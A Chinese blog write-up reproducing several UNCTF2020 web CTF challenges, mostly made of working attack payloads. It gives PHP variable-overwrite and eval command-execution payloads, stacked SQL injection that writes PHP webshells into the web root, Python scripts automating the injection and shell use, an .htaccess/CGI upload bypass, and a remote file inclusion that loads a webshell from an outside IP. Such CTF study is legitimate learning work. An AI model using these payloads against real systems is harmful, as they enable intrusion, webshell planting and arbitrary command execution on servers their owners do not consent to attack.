title: UNCTF2020web题复现
author: bmth
tags:
  - UNCTF2020
  - CTF
categories: []
img: 'https://img-blog.csdnimg.cn/20210304212502466.png'
date: 2020-11-15 16:08:00
---
这里复现一下不同解,没解出来的题和其他比较好的题目
官方wp：[https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020UNCTF](https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020UNCTF)
我的题解wp：[UNCTF2020web方向部分题解](https://blog.csdn.net/bmth666/article/details/109765055)
## easyphp
卡住的点：sha1爆破，我佛了
题目提示`?source`，给出了源码：
```php
 <?php

$adminPassword = 'd8b8caf4df69a81f2815pbcb74cd73ab';
if (!function_exists('fuxkSQL')) {
    function fuxkSQL($iText)
    {
        $oText = $iText;
        $oText = str_replace('\\\\', '\\', $oText);
        $oText = str_replace('\"', '"', $oText);
        $oText = str_replace("\'", "'", $oText);
        $oText = str_replace("'", "''", $oText);
        return $oText;
    }
}
if (!function_exists('getVars')) {
    function getVars()
    {
        $totals = array_merge($_GET, $_POST);
        if (count($_GET)) {
            foreach ($_GET as $key => $value) {
                global ${$key};
                if (is_array($value)) {
                    $temp_array = array();
                    foreach ($value as $key2 => $value2) {
                        if (function_exists('mysql_real_escape_string')) {
                            $temp_array[$key2] = fuxkSQL(trim($value2));
                        } else {
                            $temp_array[$key2] = str_replace('"', '\"', str_replace("'", "\'", (trim($value2))));
                        }
                    }
                    ${$key} = $_GET[$key] = $temp_array;
                } else {
                    if (function_exists('mysql_real_escape_string')) {
                        ${$key} = fuxkSQL(trim($value));
                    } else {
                        ${$key} = $_GET[$key] = str_replace('"', '\"', str_replace("'", "\'", (trim($value))));
                    }
                }
            }
        }
    }
}

getVars();
if (isset($source)) {
    highlight_file(__FILE__);
}

//只有admin才能设置环境变量
if (md5($password) === $adminPassword && sha1($verif) == $verif) {
    echo 'you can set config variables!!' . '</br>';
    foreach (array_keys($GLOBALS) as $key) {
        if (preg_match('/var\d{1,2}/', $key) && strlen($GLOBALS[$key]) < 12) {
            @eval("\$$key" . '="' . $GLOBALS[$key] . '";');
        }
    }
} else {
    foreach (array_keys($GLOBALS) as $key) {
        if (preg_match('/var\d{1,2}/', $key)) {
            echo ($GLOBALS[$key]) . '</br>';
        }
    }
} 
```
这个功能可以将`$_GET`中的键值直接转为变量类似于`xxx?password=1`那么就能覆盖`$adminPassword`变量
```php
$adminPassword = 'd8b8caf4df69a81f2815pbcb74cd73ab';
foreach ($_GET as $key => $value) {
  global ${$key};
}
```
将`$password`覆盖为任意值，然后将`$adminPassword`覆盖为其md5值即可
第二关sha1的0e弱等于，进行爆破
```php
<?php
for ($i5 = 0; $i5 <= 9999999999; $i5++) {
    $res = '0e' . $i5;
    //0e1290633704
    if ($res == hash('sha1', $res)) {
        print_r($res);
    }
}
```
第三关就是使用`${}`来构造语句，我的思路是`${``}`执行任意语句，思路不够清晰
```php
foreach (array_keys($GLOBALS) as $key) {
        if (preg_match('/var\d{1,2}/', $key) && strlen($GLOBALS[$key]) < 12) {
            @eval("\$$key" . '="' . $GLOBALS[$key] . '";');
        }
    }
```
>这段是将设置var开头，后面带1到2个数字变量的值，类似于var1=xxx;这样的
由于变量覆盖的环节限制了单双引号的输入，所以这里的解法为利用php复杂

最后的payload：
```php
?source=1&adminPassword=c4ca4238a0b923820dcc509a6f75849b&password=1&verif=0e1290633704&var1={$_GET[1]}&var3=${$var1()}&1=phpinfo
```
最后在`phpinfo()`找到flag
![](/bmth_blog/images/pasted-173.png)
尝试一下我之前的payload：
```php
?source=1&adminPassword=c4ca4238a0b923820dcc509a6f75849b&password=1&verif=0e1290633704&var1=${`>1.txt`}
```
发现成功写入文件1.txt，那么就可以6位以下任意命令执行了，即可写入一句话
![](/bmth_blog/images/pasted-172.png)
具体可参考：
[5位可控字符下的任意命令执行-----另一种解题方法](https://blog.csdn.net/nzjdsds/article/details/102940762)
[4位可控字符下的任意命令执行](https://blog.csdn.net/nzjdsds/article/details/102873203)

## babyeval
发现师傅们姿势很多呀，学一学
```php
<?php
    // flag在flag.php
    if(isset($_GET['a'])){
        if(preg_match('/\(.*\)/', $_GET['a']))
            die('hacker!!!');
        ob_start(function($data){
                 if (strpos($data, 'flag') !== false)
                 return 'ByeBye hacker';
                 return false;
                 });
        eval($_GET['a']);
    } else {
        highlight_file(__FILE__);
    }
    ?>
```
>不能利用带有括号的函数→利用echo输出内容。
输出内容中不能有flag→利用编码绕过

方法一：
```php
?a=echo `base64 flag.php`;
```
方法二：
`%0a`绕过，这个nb
```php
?a=system('%0Acat f* | base64');
```
方法三：
利用include函数加php伪协议
```php
?a=include 'php://filter/convert.base64-encode/resource=./flag.php';
```

## checkin-sql
过滤代码如下:
```php
function waf1($id){
        if(preg_match("/select|update|rename|delete|drop|use|updatexml|if|sleep|alter|handler|insert|where|load_file|\./i",$id))
        {
                die("0xDktb said You are a hacker!");
        }
}
function waf2($id){
        if(preg_match("/set/i",$id) && preg_match("/prepare/i",$id))
        {
                die("0xDktb says You are a hacker£¡");
        }
}
```
发现 set 和 prepare 同时出现时会被过滤，而单独出现则不会过滤
这里师傅的payload，tttttttql：
```php
<?php
$a = "1';
    create procedure `qq`(out string text(1024), in hex text(1024))
    BEGIN
        SET string = hex;
    END;
    ;#";
echo urlencode($a)."\n";
$b = "1';
    call `qq`(@decoded, 0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460);
    prepare payload from @decoded;
    execute payload;
    ;#";
echo urlencode($b);
?>
```
我们直接读取数据库的flag时会发现 flag 是假的，我们尝试读取 user 。发现我们是 root 用户，于是尝试写马 get os-shell
最后执行的python脚本
```python
import requests
 
url ="http://b93983bb-ecb9-49a9-a072-9f36460ebe13.node1.hackingfor.fun/"
##两个exp用来生成一个cioi.php，密码是cioi
payload1 = "1'%3B%0D%0A%20%20%20%20create%20procedure%20%60qq%60(out%20string%20text(1024),%20in%20hex%20text(1024))%0D%0A%20%20%20%20BEGIN%0D%0A%20%20%20%20%20%20%20%20SET%20string%20%3D%20hex%3B%0D%0A%20%20%20%20END%3B%0D%0A%20%20%20%20%3B%23"
payload2 = "1'%3B%0D%0A%20%20%20%20call%20%60qq%60(%40decoded,%200x73656C65637420273C3F706870206576616C28245F504F53545B2263696F69225D293B203F3E2720696E746F206F757466696C6520222F7661722F7777772F68746D6C2F63696F692E706870223B)%3B%0D%0A%20%20%20%20prepare%20payload%20from%20%40decoded%3B%0D%0A%20%20%20%20execute%20payload%3B%0D%0A%20%20%20%20%3B%23"
 
data = {
 "cioi":"system('cat /fffllaagg');"
}
 
requests.get(url=url+"?inject="+payload1)
requests.get(url=url+"?inject="+payload2)
 
ans = requests.post(url+"cioi.php",data=data)
print(ans.text)
```
![](/bmth_blog/images/pasted-174.png)
运行得到flag
![](/bmth_blog/images/pasted-175.png)
我自己的写文件payload没生效，看到一位web大佬的文章：[UNCTF2020](https://blog.csdn.net/l11III1111/article/details/109707403)，还是我的姿势不太对
```sql
1';PREPARE hacker from concat(char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,49,50,51,93,41,32,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,49,46,112,104,112,39));EXECUTE hacker;
```
python构造语句脚本
```python
a = "select '<?php eval($_POST[123]) ?>' into outfile '/var/www/html/1.php'"
for i in a:
	print(ord(i),end=',')
```
![](/bmth_blog/images/pasted-176.png)

最近还看到Lazzaro师傅的文章，更简单[UNCTF2020](https://lazzzaro.github.io/2020/11/14/match-UNCTF2020/)，原来可以直接0x写进去呀
```sql
1'; prepare execsql from 0x73656c656374202a2066726f6d20603078446b746260;execute execsql;#
1'; prepare execsql from 0x73656c65637420273c3f70687020406576616c28245f504f53545b6363635d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f7368656c6c2e70687027;execute execsql;#
```
![](/bmth_blog/images/pasted-206.png)

## easy_upload
这题是De1CTF 2020 checkin的原题,禁用名单(注意这里并没有禁掉\\)：
```php
perl|pyth|ph|auto|curl|base|\|>|rm|ryby|openssl|war|lua|msf|xter|telnet in contents!
```
这里师傅是上传.htaccess,开启cgi支持，上传cgi脚本，执行cgi脚本，输出flag
**上传.htaccess：**
```
Options +ExecCGI
AddHandler cgi-script .xx
```
![](/bmth_blog/images/pasted-177.png)
**上传cgi脚本**：
流程和.htaccess一致，但注意，cgi脚本最好在linux系统下编写，直接在bp里面改内容有可能出错
```cgi
#!/bin/bash
echo "Content-Type: text/plain"
echo ""
cat /flag
exit 0
```
![](/bmth_blog/images/pasted-178.png)
本题还有一个方法，使用短标签，当时没有想出来这么简单的方法。。。
![](/bmth_blog/images/pasted-179.png)
随后上传1.bmth即可获取webshell
```php
<?=eval($_POST[1]);
```
![](/bmth_blog/images/pasted-180.png)

## L0vephp
当时以为是脑洞题，原来是我见识短浅。给了一个参考文章：[eval长度限制绕过 && PHP5.6新特性](https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html)
查看源码发现有`<!-- B4Z0-@:OCnDf, -->`是base85，Orz
![](/bmth_blog/images/pasted-181.png)
解码发现是get action，即可使用文件包含，发现base被禁了，使用rot13
```php
?action=php://filter/string.rot13/resource=flag.php
```
还可以使用quoted-printable-encode
```php
?action=php://filter/convert.quoted-printable-encode/resource=flag.php
```
得到flag.php源码
```php
<?php
$flag = "unctf{7his_is_@_f4ke_f1a9}";
//hint:316E4433782E706870
?>
```
很明显是16进制，解码一下是1nD3x.php，访问得到源码
```php
 <?php 


error_reporting(0);
show_source(__FILE__);
$code=$_REQUEST['code'];

$_=array('@','\~','\^','\&','\?','\<','\>','\*','\`','\+','\-','\'','\"','\\\\','\/'); 
$__=array('eval','system','exec','shell_exec','assert','passthru','array_map','ob_start','create_function','call_user_func','call_user_func_array','array_filter','proc_open');
$blacklist1 = array_merge($_);
$blacklist2 = array_merge($__);

if (strlen($code)>16){
    die('Too long');
}

foreach ($blacklist1 as $blacklisted) { 
    if (preg_match ('/' . $blacklisted . '/m', $code)) { 
        die('WTF???'); 
    } 
} 

foreach ($blacklist2 as $blackitem) {
    if (preg_match ('/' . $blackitem . '/im', $code)) {
        die('Sry,try again');
    }
}

@eval($code);
?> 
```
**方法一**
存在远程文件包含，直接在服务器上写一句话即可
`?code=include$_GET[1];&1=http://47.101.145.94/abc.txt`
![](/bmth_blog/images/pasted-182.png)

**方法二**
在PHP中可以使用`func(...$arr)`这样的方式，将`$arr`数组展开成多个参数，传入func函数
```php
?1[]=test&1[]=system('ls /');&2=assert
POST
code=usort(...$_GET);
```
![](/bmth_blog/images/pasted-183.png)
**方法三**
有一种思路，利用file_put_contents可以将字符一个个地写入一个文件中，大概请求如下：
```php
?code=$_GET[a](N,a,8);&a=file_put_contents
```
>file_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串'N'；第二个参数是要写入的数据，a也被转换成字符串'a'；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。
除了file_put_contents，error_log函数效果也类似。
但这个方法有个问题，就是file_put_contents第二个参数如果是符号，就会导致PHP出错，比如`code=$_GET[a](N,<,8);&a=file_put_contents`，但如果要写webshell的话，`<`等符号又是必不可少的。每次向文件'N'中写入一个字母或数字，最后构成一个base64字符串，再包含的时候使用php://filter对base64进行解码即可。

最后请求如下：
```php
# 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbOV0pOw
# 最后包含
?code=include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=B
```
写一个脚本跑数据:
```python
import requests
dic='PD9waHAgZXZhbCgkX1BPU1RbOV0pOw'
for i in dic:
    b="$_GET[a](B,"+i+",8);&a=file_put_contents"
    url='http://803cb7e2-feab-4043-b79d-cf724022a37a.node1.hackingfor.fun/1nD3x.php?code='+str(b)
    print(url)
    res = requests.get(url=url)
```
最后包含即可获取shell
![](/bmth_blog/images/pasted-184.png)